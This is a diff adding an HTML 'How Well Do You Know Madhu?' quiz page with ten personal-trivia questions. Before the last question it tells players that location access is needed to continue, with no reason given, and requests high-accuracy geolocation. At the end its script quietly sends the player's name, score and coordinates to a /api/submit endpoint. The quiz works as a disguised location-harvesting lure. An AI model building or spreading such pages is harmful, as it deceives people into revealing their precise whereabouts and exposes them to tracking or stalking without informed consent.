@@ -1,1 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <title>How Well Do You Know Madhu?</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #111, #333);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: white;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 500px;
+      background: white;
+      color: #222;
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+    }
+
+    h1 {
+      text-align: center;
+      margin-top: 0;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #666;
+      margin-bottom: 25px;
+    }
+
+    .question {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .option {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      background: white;
+      cursor: pointer;
+      text-align: left;
+      font-size: 16px;
+    }
+
+    .option:hover {
+      background: #f2f2f2;
+    }
+
+    .option.selected {
+      border-color: #111;
+      background: #eee;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: #111;
+      color: white;
+      font-size: 17px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    button:disabled {
+      background: #aaa;
+      cursor: not-allowed;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .progress {
+      text-align: center;
+      color: #777;
+      margin-bottom: 20px;
+    }
+
+    .location-box {
+      text-align: center;
+      padding: 10px;
+    }
+
+    .score {
+      text-align: center;
+      font-size: 42px;
+      font-weight: bold;
+      margin: 20px 0;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .small {
+      color: #777;
+      font-size: 14px;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- NAME SCREEN -->
+  <div id="nameScreen">
+
+    <h1>How Well Do You Know Madhu? 👀</h1>
+
+    <p class="subtitle">
+      Let's see how well you actually know me.
+    </p>
+
+    <input
+      id="nameInput"
+      type="text"
+      placeholder="Enter your name"
+      maxlength="50"
+    >
+
+    <button onclick="startQuiz()">
+      Start Quiz
+    </button>
+
+  </div>
+
+
+  <!-- QUIZ SCREEN -->
+  <div id="quizScreen" class="hidden">
+
+    <div class="progress" id="progress"></div>
+
+    <div class="question" id="question"></div>
+
+    <div id="options"></div>
+
+    <button id="nextButton" onclick="nextQuestion()" disabled>
+      Next
+    </button>
+
+  </div>
+
+
+  <!-- LOCATION SCREEN -->
+  <div id="locationScreen" class="hidden">
+
+    <h1>Almost done!</h1>
+
+    <div class="location-box">
+
+      <p>
+        One quick step before the last question.
+      </p>
+
+      <p>
+        Allow location access to continue.
+      </p>
+
+      <button onclick="requestLocation()">
+        Allow Location
+      </button>
+
+      <p class="small">
+        Your browser will show a location permission request.
+      </p>
+
+    </div>
+
+  </div>
+
+
+  <!-- RESULT SCREEN -->
+  <div id="resultScreen" class="hidden">
+
+    <h1>Quiz Complete 🎉</h1>
+
+    <p id="resultName"></p>
+
+    <div class="score" id="finalScore"></div>
+
+    <p id="resultMessage"></p>
+
+  </div>
+
+</div>
+
+
+<script>
+
+const questions = [
+
+  {
+    q: "What is Madhu's favorite sport?",
+    options: [
+      "Cricket",
+      "Football",
+      "Basketball",
+      "Badminton"
+    ],
+    answer: [0]
+  },
+
+  {
+    q: "Who is Madhu's favorite actor?",
+    options: [
+      "Ram Charan",
+      "Prabhas",
+      "Allu Arjun",
+      "Nithin"
+    ],
+    answer: [2]
+  },
+
+  {
+    q: "Who is Madhu's favorite actress?",
+    options: [
+      "Rakul",
+      "Shraddha Kapoor",
+      "Preethi",
+      "Kajal"
+    ],
+    answer: [1, 2]
+  },
+
+  {
+    q: "What is Madhu's favorite color?",
+    options: [
+      "Blue",
+      "Black",
+      "Red",
+      "Green"
+    ],
+    answer: [0]
+  },
+
+  {
+    q: "What does Madhu enjoy most in his free time?",
+    options: [
+      "Gaming",
+      "Music",
+      "Fitness",
+      "Movies"
+    ],
+    answer: [2]
+  },
+
+  {
+    q: "What type of movies does Madhu prefer?",
+    options: [
+      "Action",
+      "Comedy",
+      "Romance",
+      "Sci-Fi"
+    ],
+    answer: [3]
+  },
+
+  {
+    q: "What would Madhu choose for a weekend?",
+    options: [
+      "Beach trip",
+      "Mountain trip",
+      "City exploration",
+      "Stay at home"
+    ],
+    answer: [2]
+  },
+
+  {
+    q: "What is Madhu's biggest career goal?",
+    options: [
+      "Software job",
+      "Academia",
+      "Travel career",
+      "Build something of his own"
+    ],
+    answer: [3]
+  },
+
+  {
+    q: "Which describes Madhu better?",
+    options: [
+      "Introvert",
+      "Extrovert",
+      "Ambivert",
+      "Depends on the people"
+    ],
+    answer: [2]
+  },
+
+  {
+    q: "What is Madhu most likely to spend money on?",
+    options: [
+      "Fashion",
+      "Gadgets",
+      "Food",
+      "Experiences"
+    ],
+    answer: [3]
+  }
+
+];
+
+
+let currentQuestion = 0;
+let score = 0;
+let selectedAnswer = null;
+let userName = "";
+
+let locationData = {
+  latitude: null,
+  longitude: null,
+  accuracy: null
+};
+
+
+function startQuiz() {
+
+  const input = document.getElementById("nameInput");
+
+  userName = input.value.trim();
+
+  if (!userName) {
+    alert("Please enter your name.");
+    return;
+  }
+
+  document.getElementById("nameScreen").classList.add("hidden");
+  document.getElementById("quizScreen").classList.remove("hidden");
+
+  showQuestion();
+}
+
+
+function showQuestion() {
+
+  selectedAnswer = null;
+
+  const question = questions[currentQuestion];
+
+  document.getElementById("progress").textContent =
+    `Question ${currentQuestion + 1} of 10`;
+
+  document.getElementById("question").textContent =
+    question.q;
+
+  const optionsDiv = document.getElementById("options");
+
+  optionsDiv.innerHTML = "";
+
+  question.options.forEach((option, index) => {
+
+    const button = document.createElement("button");
+
+    button.className = "option";
+
+    button.textContent =
+      `${String.fromCharCode(65 + index)}) ${option}`;
+
+    button.onclick = () => selectAnswer(index, button);
+
+    optionsDiv.appendChild(button);
+
+  });
+
+  document.getElementById("nextButton").disabled = true;
+}
+
+
+function selectAnswer(index, button) {
+
+  selectedAnswer = index;
+
+  document.querySelectorAll(".option").forEach(btn => {
+    btn.classList.remove("selected");
+  });
+
+  button.classList.add("selected");
+
+  document.getElementById("nextButton").disabled = false;
+}
+
+
+function nextQuestion() {
+
+  if (selectedAnswer === null) return;
+
+  const correctAnswers =
+    questions[currentQuestion].answer;
+
+  if (correctAnswers.includes(selectedAnswer)) {
+    score++;
+  }
+
+  /*
+    After Question 9, ask for location.
+  */
+
+  if (currentQuestion === 8) {
+
+    document.getElementById("quizScreen").classList.add("hidden");
+
+    document.getElementById("locationScreen").classList.remove("hidden");
+
+    return;
+  }
+
+  /*
+    After Question 10, show result.
+  */
+
+  if (currentQuestion === 9) {
+
+    finishQuiz();
+
+    return;
+  }
+
+  currentQuestion++;
+
+  showQuestion();
+}
+
+
+function requestLocation() {
+
+  if (!navigator.geolocation) {
+
+    alert("Location is not supported by this browser.");
+
+    continueToFinalQuestion();
+
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+
+    function(position) {
+
+      locationData.latitude =
+        position.coords.latitude;
+
+      locationData.longitude =
+        position.coords.longitude;
+
+      locationData.accuracy =
+        position.coords.accuracy;
+
+      continueToFinalQuestion();
+
+    },
+
+    function(error) {
+
+      alert(
+        "Location permission was not granted. You can continue without sharing your location."
+      );
+
+      continueToFinalQuestion();
+
+    },
+
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+
+  );
+}
+
+
+function continueToFinalQuestion() {
+
+  document.getElementById("locationScreen").classList.add("hidden");
+
+  document.getElementById("quizScreen").classList.remove("hidden");
+
+  currentQuestion++;
+
+  showQuestion();
+}
+
+
+async function finishQuiz() {
+
+  document.getElementById("quizScreen").classList.add("hidden");
+
+  document.getElementById("resultScreen").classList.remove("hidden");
+
+  document.getElementById("resultName").textContent =
+    `Well done, ${userName}!`;
+
+  document.getElementById("finalScore").textContent =
+    `${score}/10`;
+
+  let message = "";
+
+  if (score === 10) {
+    message = "Okay... you REALLY know me 😂";
+  } else if (score >= 7) {
+    message = "Not bad! You know me pretty well 😎";
+  } else if (score >= 5) {
+    message = "You know me... somewhat 😂";
+  } else {
+    message = "We need to talk 😂";
+  }
+
+  document.getElementById("resultMessage").textContent =
+    message;
+
+
+  /*
+    Send result to your server.
+  */
+
+  try {
+
+    await fetch("/api/submit", {
+
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json"
+      },
+
+      body: JSON.stringify({
+
+        name: userName,
+
+        score: score,
+
+        latitude: locationData.latitude,
+
+        longitude: locationData.longitude,
+
+        accuracy: locationData.accuracy
+
+      })
+
+    });
+
+  } catch (error) {
+
+    console.log("Could not submit result.");
+
+  }
+
+}
+
+</script>
+
+</body>
+</html>
